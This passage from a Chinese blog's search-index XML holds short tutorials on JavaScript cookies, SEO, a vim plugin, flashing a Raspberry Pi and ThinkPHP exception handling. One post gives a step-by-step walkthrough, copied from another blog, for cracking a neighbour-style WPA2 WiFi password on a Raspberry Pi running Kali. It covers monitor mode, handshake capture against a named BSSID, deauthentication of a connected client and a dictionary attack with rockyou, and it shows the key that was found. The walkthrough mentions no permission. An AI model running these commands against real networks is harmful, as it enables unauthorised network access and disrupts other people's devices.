&#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">"id"</span>: <span class="number">5</span>,</span><br><span class="line">            <span class="attr">"img_id"</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="attr">"key_word"</span>: <span class="string">"10"</span>,</span><br><span class="line">            <span class="attr">"type"</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="attr">"delete_time"</span>: <span class="literal">null</span>,</span><br><span class="line">            <span class="attr">"banner_id"</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="attr">"update_time"</span>: <span class="string">"1970-01-01 08:00:00"</span>,</span><br><span class="line">            <span class="attr">"image"</span>: &#123;</span><br><span class="line">                <span class="attr">"id"</span>: <span class="number">1</span>,</span><br><span class="line">                <span class="attr">"url"</span>: <span class="string">"/banner-1a.png"</span>,</span><br><span class="line">                <span class="attr">"from"</span>: <span class="number">1</span>,</span><br><span class="line">                <span class="attr">"delete_time"</span>: <span class="literal">null</span>,</span><br><span class="line">                <span class="attr">"update_time"</span>: <span class="string">"1970-01-01 08:00:00"</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></p>
]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>TP5.0</tag>
      </tags>
  </entry>
  <entry>
    <title>「前端」Javascript学习笔记-cookie使用</title>
    <url>/2018/06/28/%E3%80%90%E5%89%8D%E7%AB%AF%E3%80%91Javascript%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-cookie%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h4 id="1-什么是COOKIE"><a href="#1-什么是COOKIE" class="headerlink" title="1. 什么是COOKIE"></a>1. 什么是COOKIE</h4><p>&emsp;cookie 是存储于访问者的计算机中的变量。每当同一台计算机通过浏览器请求某个页面时，就会发送这个 cookie。你可以使用 JavaScript 来创建和取回 cookie 的值。cookie 的容量为4KB。<br><a id="more"></a></p>
<hr>
<h4 id="2-COOKIE写入读取和删除"><a href="#2-COOKIE写入读取和删除" class="headerlink" title="2. COOKIE写入读取和删除"></a>2. COOKIE写入读取和删除</h4><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//设置cookie</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setCookie</span>(<span class="params">cname, cvalue, exdays</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> d = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">    d.setTime(d.getTime() + (exdays*<span class="number">24</span>*<span class="number">60</span>*<span class="number">60</span>*<span class="number">1000</span>));</span><br><span class="line">    <span class="keyword">var</span> expires = <span class="string">"expires="</span>+d.toUTCString();</span><br><span class="line">    <span class="built_in">document</span>.cookie = cname + <span class="string">"="</span> + cvalue + <span class="string">"; "</span> + expires;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//获取cookie</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getCookie</span>(<span class="params">cname</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> name = cname + <span class="string">"="</span>;</span><br><span class="line">    <span class="keyword">var</span> ca = <span class="built_in">document</span>.cookie.split(<span class="string">';'</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;ca.length; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> c = ca[i];</span><br><span class="line">        <span class="keyword">while</span> (c.charAt(<span class="number">0</span>)==<span class="string">' '</span>) c = c.substring(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (c.indexOf(name) != <span class="number">-1</span>) <span class="keyword">return</span> c.substring(name.length, c.length);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//清除cookie</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clearCookie</span>(<span class="params">name</span>) </span>&#123;  </span><br><span class="line">    setCookie(name, <span class="string">""</span>, <span class="number">-1</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>注:<span class="exturl" data-url="aHR0cDovL3d3dy53M3NjaG9vbC5jb20uY24vanMvanNfY29va2llcy5hc3A=" title="http://www.w3school.com.cn/js/js_cookies.asp">文章参考于w3school<i class="fa fa-external-link"></i></span></p>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>javascript</tag>
      </tags>
  </entry>
  <entry>
    <title>「SEO」SEO学习笔记-SEO概述</title>
    <url>/2018/06/19/%E3%80%90SEO%E3%80%91SEO%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-SEO%E6%A6%82%E8%BF%B0/</url>
    <content><![CDATA[<h4 id="1-什么是SEO"><a href="#1-什么是SEO" class="headerlink" title="1. 什么是SEO?"></a>1. 什么是SEO?</h4><p>&emsp;SEO就是非付费的搜索引擎优化。利用一些技术手段和优化手段让自己的产品或网站排在推广位之后的前几位。</p>
<hr>
<p>x</p>
<h4 id="2-权重"><a href="#2-权重" class="headerlink" title="2. 权重"></a>2. 权重</h4><p>&emsp;搜索引擎评判网站的质量。</p>
]]></content>
      <categories>
        <category>SEO</category>
      </categories>
      <tags>
        <tag>SEO</tag>
      </tags>
  </entry>
  <entry>
    <title>「vim」vim学习笔记-多重复制插件</title>
    <url>/2018/06/15/%E3%80%90vim%E3%80%91vim%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%A4%9A%E9%87%8D%E5%A4%8D%E5%88%B6%E6%8F%92%E4%BB%B6/</url>
    <content><![CDATA[<h4 id="1-说明"><a href="#1-说明" class="headerlink" title="1. 说明"></a>1. 说明</h4><p>&emsp;在vim的文本编辑中有时会用到以前的历史复制记录，而vim又只能够支持一次复制。我很不理解，不过有一个叫<strong>YankRing.vim</strong>的插件实现了这个功能(多重复制)。<br><a id="more"></a></p>
<hr>
<h4 id="2-使用"><a href="#2-使用" class="headerlink" title="2. 使用"></a>2. 使用</h4><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">Bundle <span class="string">'vim-scripts/YankRing.vim'</span> <span class="string">"在sfp13-vim中的.vimrc.local</span></span><br></pre></td></tr></table></figure></div>
<div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">:<span class="built_in">source</span> %</span><br><span class="line">:PluginInstall</span><br></pre></td></tr></table></figure></div>
<p><code>:YRShow</code>查看复制的历史记录，用<code>j</code>和<code>k</code>来选择。驾车确定。</p>
]]></content>
      <categories>
        <category>vim</category>
      </categories>
      <tags>
        <tag>vim</tag>
      </tags>
  </entry>
  <entry>
    <title>「RaspberryPi」树梅派学习笔记-使用kali破解WIFI</title>
    <url>/2018/06/13/%E3%80%90RaspberryPi%E3%80%91%E6%A0%91%E6%A2%85%E6%B4%BE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%BD%BF%E7%94%A8kali%E7%A0%B4%E8%A7%A3WIFI/</url>
    <content><![CDATA[<h4 id="1-说明"><a href="#1-说明" class="headerlink" title="1. 说明"></a>1. 说明</h4><p> &emsp;树莓派3B已经成为arm主流开发板，不仅有成熟完善的raspbian系统，还可以安装Ubuntu、Centos、Kali系统，因此，树莓派可以做各种各样的事，接下来，我就介绍下树莓派破解Wi-Fi密码的过程。</p>
<hr>
 <a id="more"></a>
<h4 id="2-安装kali"><a href="#2-安装kali" class="headerlink" title="2.安装kali"></a>2.安装kali</h4><p> &emsp;因为Kali是一个专门的网络渗透系统，自带很多工具，所以就采用直接安装Kali来使用airmon-ng工具。<br>下载地址：<span class="exturl" data-url="aHR0cHM6Ly93d3cub2ZmZW5zaXZlLXNlY3VyaXR5LmNvbS9rYWxpLWxpbnV4LWFybS1pbWFnZXMv" title="https://www.offensive-security.com/kali-linux-arm-images/">https://www.offensive-security.com/kali-linux-arm-images/<i class="fa fa-external-link"></i></span></p>
<blockquote>
<p>下载下来是kali-2017.3-rpi3-nexmon.img.xz文件。<br>在Windows下直接使用解压缩软件解压。<br>在Linux下用 xz -d kali-2017.3-rpi3-nexmon.img.xz 解压。<br>得到的img文件就可以直接使用了，将其写入TF卡即可。</p>
</blockquote>
<hr>
<h4 id="3-升级Kali"><a href="#3-升级Kali" class="headerlink" title="3.升级Kali"></a>3.升级Kali</h4><blockquote>
<p>将树莓派插上显示屏和鼠标键盘。<br>用户：root<br>密码：toor</p>
</blockquote>
<div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 打开Terminal，执行</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free"</span> &gt; /etc/apt/sources.list</span><br><span class="line">apt update &amp;&amp; apt upgrade -y</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装完整版kali</span></span><br><span class="line"><span class="comment"># apt install kali-linux-all</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装Extend Filesystem（可选）</span></span><br><span class="line"><span class="comment"># apt install gparted -y</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装xrdp [不能插上显示屏使用]</span></span><br><span class="line"><span class="comment"># apt install xrdp</span></span><br><span class="line"><span class="comment"># 开机自启</span></span><br><span class="line"><span class="comment"># update-rc.d xrdp enable</span></span><br></pre></td></tr></table></figure></div>
<hr>
<h4 id="4-开始破解"><a href="#4-开始破解" class="headerlink" title="4.开始破解"></a>4.开始破解</h4><blockquote>
<p>破解过程如下：</p>
<ul>
<li>找到设备iwconfig并开启监控</li>
<li>查看附近的Wi-Fi，并选择一个</li>
<li>攻击并开始抓包，得到handshake</li>
<li>下载字典，开始破解</li>
</ul>
</blockquote>
<div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看得到网卡名为wlan0：</span></span><br><span class="line">iwconfig</span><br><span class="line"><span class="comment"># 内容如下：</span></span><br><span class="line">eth0      no wireless extensions.</span><br><span class="line"></span><br><span class="line">wlan0     IEEE 802.11  ESSID:off/any  ...</span><br><span class="line"></span><br><span class="line"><span class="comment"># 找到Wi-Fi代号为wlan0，接着启动monitor模式：</span></span><br><span class="line">airmon-ng start wlan0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看附近的无线网络</span></span><br><span class="line">airodump-ng wlan0mon</span><br><span class="line"><span class="comment"># 内容如下：</span></span><br><span class="line">BSSID              PWR  Beacons    <span class="comment">#Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID                                             </span></span><br><span class="line"></span><br><span class="line"> F2:B4:29:E5:1C:74   -1        0       20    0   6  -1   OPN              &lt;length:  0&gt;                                      </span><br><span class="line"> 94:77:2B:47:92:1C  -74      119     1842   49   7  54e  WPA2 CCMP   PSK  HUAWEI-RF4BXM                                  </span><br><span class="line"> 14:75:90:DB:90:91  -81       53        0    0  11  54e. WPA2 CCMP   PSK  TP-LINK_DB9091    </span><br><span class="line"></span><br><span class="line"><span class="comment"># 选择一个Wi-Fi，复制BSSID，记下CH信道，组合如下命令开始攻击抓包</span></span><br><span class="line"><span class="comment"># [演示选择TP-Link：airodump-ng wlan0mon --bssid 复制的BSSID -c CH信道 -w 保存名]</span></span><br><span class="line">airodump-ng wlan0mon --bssid 14:75:90:DB:90:91 -c 11 -w wificrack</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可以看到，有一台设备连接到该路由WiFi，但此时没有设备连入，故抓不到完整4步握手包。</span></span><br><span class="line"><span class="comment"># 若抓不到4步握手，则通过以下命令断开设备与WiFi的连接，使其重新建立连接从而可以抓取四步握手信息：</span></span><br><span class="line"><span class="comment"># 新开一个Terminal窗口：[参数：攻击2次，路由ssid和设备Mac地址]</span></span><br><span class="line">aireplay-ng -0 2 -a 14:75:90:DB:90:91 -c 54:DC:1D:27:0D:50 wlan0mon</span><br><span class="line"></span><br><span class="line"><span class="comment"># 原窗口得到握手包：内容如下：</span></span><br><span class="line"> CH 11 ][ Elapsed: 5 mins ][ 2018-01-29 05:52 ][ WPA handshake: 14:75:90:DB:90:91                                           </span><br><span class="line"></span><br><span class="line"> BSSID              PWR RXQ  Beacons    <span class="comment">#Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID                                         </span></span><br><span class="line"></span><br><span class="line"> 14:75:90:DB:90:91  -71  93     3136       43    0  11  54e. WPA2 CCMP   PSK  TP-LINK_DB9091                                </span><br><span class="line"></span><br><span class="line"> BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                  </span><br><span class="line"></span><br><span class="line"> 14:75:90:DB:90:91  54:DC:1D:27:0D:50  -39    0e- 0e     0       44  TP-LINK_DB9091 </span><br><span class="line"></span><br><span class="line">通过ls wificrack*命令查看抓到的信息保存的文件（多的wpa包是之前做测试保存下来的）：</span><br><span class="line"></span><br><span class="line">这里看最新的那个即wifi-04即可，可以看到总共有4个。</span><br><span class="line"></span><br><span class="line"><span class="comment"># 后面使用Kali Linux中默认存在的字典，目录[需要使用命令来解压]</span></span><br><span class="line">/usr/share/wordlists/rockyou.txt.zip</span><br><span class="line"><span class="comment"># 这里顺便记录一下Kali中几个常用的字典文件的位置：</span></span><br><span class="line">/usr/share/john/password.lst</span><br><span class="line">/usr/share/wfuzz/wordlist</span><br><span class="line">/usr/share/ wordlists</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果没有该文件，就需要下载：</span></span><br><span class="line">wget http://scrapmaker.com/data/wordlists/dictionaries/rockyou.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 破解：[rockyou.txt是字典、wifi-01.cap是抓包]</span></span><br><span class="line">aircrack-ng -w rockyou.txt wificrack-01.cap</span><br><span class="line"><span class="comment"># 结果如下：[密码为：12345678]</span></span><br><span class="line">                                 Aircrack-ng 1.2 rc4                                                                        </span><br><span class="line"></span><br><span class="line">      [00:00:00] 4/4 keys tested (31.56 k/s)                                                                                </span><br><span class="line"></span><br><span class="line">      Time left: 0 seconds                                     100.00%                                                      </span><br><span class="line"></span><br><span class="line">                           KEY FOUND! [ 12345678 ]                                                                          </span><br><span class="line"><span class="comment"># 关闭wlan0无线网卡monitor mode</span></span><br><span class="line">airmon-ng stop wlan0mon</span><br></pre></td></tr></table></figure></div>
<p>注:本文转自<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2t4d2lueHAvYXJ0aWNsZS9kZXRhaWxzLzc5MTg3NDcy" title="https://blog.csdn.net/kxwinxp/article/details/79187472">树莓派3B+ 破解Wi-Fi密码<i class="fa fa-external-link"></i></span>,亲测有效^-^ !!!</p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>RaspberryPi</tag>
      </tags>
  </entry>
  <entry>
    <title>「RaspberryPi」树梅派学习笔记-烧录系统</title>
    <url>/2018/06/11/%E3%80%90RaspberryPi%E3%80%91%E6%A0%91%E6%A2%85%E6%B4%BE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E7%83%A7%E5%BD%95%E7%B3%BB%E7%BB%9F/</url>
    <content><![CDATA[<h4 id="1-说明"><a href="#1-说明" class="headerlink" title="1. 说明"></a>1. 说明</h4><p>&emsp;树梅派3b是以TF卡作数据盘。需要准备一个闲置TF卡和读卡器，并下载<span class="exturl" data-url="aHR0cHM6Ly93d3cucmFzcGJlcnJ5cGkub3JnL2Rvd25sb2Fkcy8=" title="https://www.raspberrypi.org/downloads/">树梅派官方系统<i class="fa fa-external-link"></i></span>raspberrypi.org/downloads/写进去才能使用树梅派。</p>
<hr>
<a id="more"></a>
<h4 id="2-写入系统"><a href="#2-写入系统" class="headerlink" title="2.写入系统"></a>2.写入系统</h4><blockquote>
<ul>
<li>2.1 将系统压缩包解压成img格式，放到一个英文盘符的分区中任意英文目录中。</li>
<li>2.2 <a href="/library/download/other/20180611/Win32DiskImager-0.9.5-binary.zip" downloads="Win32DiskImager-0.9.5-binary.zip"><strong>下载</strong></a>并解压打开Win32DiskImager工具 。选中TF卡和系统镜像并确认写入。等待进度完成就完成了。<br><img src="/uploads/20180611/2219.png" alt="Win32DiskImager"></li>
<li>2.3 其它主流系统:<br>  <span class="exturl" data-url="aHR0cHM6Ly93d3cub2ZmZW5zaXZlLXNlY3VyaXR5LmNvbS9rYWxpLWxpbnV4LWFybS1pbWFnZXMv" title="https://www.offensive-security.com/kali-linux-arm-images/">kali<i class="fa fa-external-link"></i></span>,<br>  <span class="exturl" data-url="aHR0cDovL21zLWlvdC5naXRodWIuaW8vY29udGVudC9lbi1VUy9Eb3dubG9hZHMuaHRt" title="http://ms-iot.github.io/content/en-US/Downloads.htm">Windows10 IOT<i class="fa fa-external-link"></i></span>,<br>  <span class="exturl" data-url="aHR0cHM6Ly91YnVudHUtIG1hdGUub3JnL3Jhc3BiZXJyeS1waS8=" title="https://ubuntu- mate.org/raspberry-pi/">Ubuntu Mate<i class="fa fa-external-link"></i></span>,<br>  <span class="exturl" data-url="aHR0cDovL21pcnJvci5jZW50b3Mub3JnL2FsdGFyY2gvNy9pc29zL2FybWhmcC8=" title="http://mirror.centos.org/altarch/7/isos/armhfp/">CentOS<i class="fa fa-external-link"></i></span>,<br>  <span class="exturl" data-url="aHR0cDovL3BpZG9yYS5jYS8=" title="http://pidora.ca/">Fedora Remix<i class="fa fa-external-link"></i></span>。</li>
</ul>
</blockquote>
<hr>
<h4 id="3-使用并连接"><a href="#3-使用并连接" class="headerlink" title="3.使用并连接"></a>3.使用并连接</h4><blockquote>
<ul>
<li>3.1 直接连接使用。将数据卡放入树梅派并接上电源键盘和接上HDMI显示器。</li>
<li>3.2 远程连接使用。在TF卡根目录新建空文件<code>ssh</code>，接上网线并在路由器找到该IP，或者在局域网中linux中输入<code>ssh pi@rasberrypi</code>连接。帐号:pi，默认密码：raspberry。</li>
</ul>
</blockquote>
<hr>
<h4 id="4-格式化TF卡"><a href="#4-格式化TF卡" class="headerlink" title="4. 格式化TF卡"></a>4. 格式化TF卡</h4><blockquote>
<ul>
<li>4.1<a href="/library/download/other/20180611/SD Formatter_存储卡彻底格式化.zip" download="SD Formatter_存储卡彻底格式化.zip"><strong>下载格式化工具</strong></a>并解压后选中TF卡格式化。<h5 id="4-2-如果TF卡电脑检测不到，可以尝试HDDLLFsetup来修复："><a href="#4-2-如果TF卡电脑检测不到，可以尝试HDDLLFsetup来修复：" class="headerlink" title="4.2 如果TF卡电脑检测不到，可以尝试HDDLLFsetup来修复："></a>4.2 如果TF卡电脑检测不到，可以尝试HDDLLFsetup来修复：</h5></li>
<li>4.2.1 <a href="/library/download/other/20180611/HDDLLFsetup.4.40.exe" download="HDDLLFsetup.4.40.exe"><strong>下载格式化工具</strong></a><span class="exturl" data-url="aHR0cDovL2hkZGd1cnUuY29tLw==" title="http://hddguru.com/">官网<i class="fa fa-external-link"></i></span>并安装。</li>
<li>4.2.2将TF卡用读卡器连接电脑并打开Hard Disk Low Level Format Tool选中TF卡。在Hard Disk Low Level Format Tool中选择LOW_LEVE FOMAT 确定格式化。根据TF卡的大小来决定格式化的时长。<br><img src="/uploads/20180611/2139.png" alt="Hard Disk Low Level Format Tool"></li>
</ul>
</blockquote>
<hr>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>RaspberryPi</tag>
      </tags>
  </entry>
  <entry>
    <title>「php」TP5.0学习笔记-全局异常处理接管</title>
    <url>/2018/06/11/%E3%80%90php%E3%80%91TP5-0%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%85%A8%E5%B1%80%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E6%8E%A5%E7%AE%A1/</url>
    <content><![CDATA[<h4 id="1-说明"><a href="#1-说明" class="headerlink" title="1. 说明"></a>1. 说明</h4><p>&emsp; 感谢做微信小程序的那位(抱歉，忘记他的名字了)基于TP5.0给我演示全局异常处理的AOP编程思想。顾名思义，全局异常处理就是程序抛出异常后统一在一个地方处理。这样做的好处就是当程序出现异常时不用写大量重复的代码来，减少代码的数量，减少维护成本。<br>&emsp;其实很简单官方文档也写了，无非就3步：1，在一个地方写好异常处理的类;2，把类的路径写入配置文件中;3，抛出异常或者代码运行错误就会去执行这个类。<br><a id="more"></a></p>
<hr>
<h4 id="2-好，开干！"><a href="#2-好，开干！" class="headerlink" title="2.好，开干！"></a>2.好，开干！</h4><h5 id="2-1-先写用于处理异常的类"><a href="#2-1-先写用于处理异常的类" class="headerlink" title="2.1 先写用于处理异常的类"></a>2.1 先写用于处理异常的类</h5><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">$ php think build --module lib <span class="comment">#TP5.0的根目录新建一个lib模块</span></span><br><span class="line"><span class="variable">$mkdir</span> application/lib/exception ; </span><br><span class="line">$ vim application/lib/exception/ExceptionHandle.php ; <span class="comment">#编辑自定义异常类</span></span><br></pre></td></tr></table></figure></div>
<div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *用于自定义异常处理</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">lib</span>\<span class="title">exception</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">exception</span>\<span class="title">Handle</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Exception</span>; <span class="comment">//引入php内置抛出类</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Request</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Log</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Config</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">lib</span>\<span class="title">exception</span>\<span class="title">BaseException</span>; <span class="comment">//引入自定义错误类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ExceptionHandle</span> <span class="keyword">extends</span> <span class="title">Handle</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $code;</span><br><span class="line">    <span class="keyword">private</span> $msg;</span><br><span class="line">    <span class="keyword">private</span> $errorCode;</span><br><span class="line">    <span class="keyword">private</span> $url;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *当配置好后，TP5.0的错误作息会在这个方法中处理</span></span><br><span class="line"><span class="comment">     *<span class="doctag">@return</span> mix</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span><span class="params">(\Exception $e)</span> </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    		<span class="comment">//判断抛出的错误是否自定义，是不返回自定义错误信息</span></span><br><span class="line">        <span class="keyword">if</span>($e <span class="keyword">instanceof</span> BaseException)&#123; </span><br><span class="line">            <span class="keyword">$this</span>-&gt;code = $e-&gt;code;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;msg = $e-&gt;msg;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;errrorCode = $e-&gt;errorCode;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(Config::get(<span class="string">"app_debug"</span>))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">parent</span>::render($e); <span class="comment">//返回tp5内置异常,用于服务器调试用。</span></span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;code = <span class="number">500</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;msg  = <span class="string">"服务器内部错误，不能告诉你"</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;errorCode = <span class="number">999</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;recordErrorLog($e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        $url = (Request::instance())-&gt;url();</span><br><span class="line">        $result =  [</span><br><span class="line">            <span class="string">"msg"</span> =&gt; <span class="keyword">$this</span>-&gt;msg,</span><br><span class="line">            <span class="string">"code"</span> =&gt; <span class="keyword">$this</span>-&gt;code,</span><br><span class="line">            <span class="string">"requestURL"</span> =&gt; $url</span><br><span class="line">        ];</span><br><span class="line">       <span class="keyword">return</span> json($result,<span class="keyword">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     *将异常写入日志</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">recordErrorLog</span><span class="params">(\Exception $e)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Log::init([</span><br><span class="line">            <span class="string">"type"</span> =&gt; <span class="string">"File"</span>,</span><br><span class="line">            <span class="string">"path"</span> =&gt; LOG_PATH,</span><br><span class="line">            <span class="string">"level"</span>     =&gt; [<span class="string">"error"</span>]</span><br><span class="line">         ]);</span><br><span class="line">       Log::record($e-&gt;getMessage(), <span class="string">"error"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *用配置错误信息的基类</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">lib</span>\<span class="title">exception</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Exception</span>; <span class="comment">//引入TP5.0异常类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BaseException</span> <span class="keyword">extends</span> <span class="title">Exception</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $code = <span class="number">400</span>;</span><br><span class="line">    <span class="keyword">public</span> $msg  = <span class="string">"参数错误"</span>;</span><br><span class="line">    <span class="keyword">public</span> $errorCode = <span class="number">10000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($params=[])</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!is_array($params))&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(array_key_exists(<span class="string">'code'</span>,$params))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;code = $params[<span class="string">'code'</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(array_key_exists(<span class="string">'msg'</span>,$params))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;msg = $params[<span class="string">'msg'</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(array_key_exists(<span class="string">'errorCode'</span>,$params))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;errorCode = $params[<span class="string">'errorCode'</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *定义错误参数类</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">lib</span>\<span class="title">exception</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">lib</span>\<span class="title">exception</span>\<span class="title">BaseException</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BannerMissException</span> <span class="keyword">extends</span> <span class="title">BaseException</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $code = <span class="number">404</span>;</span><br><span class="line">    <span class="keyword">public</span> $msg  = <span class="string">"Banner不存在"</span>;</span><br><span class="line">    <span class="keyword">public</span> $errorCode = <span class="number">40000</span>;</span><br><span 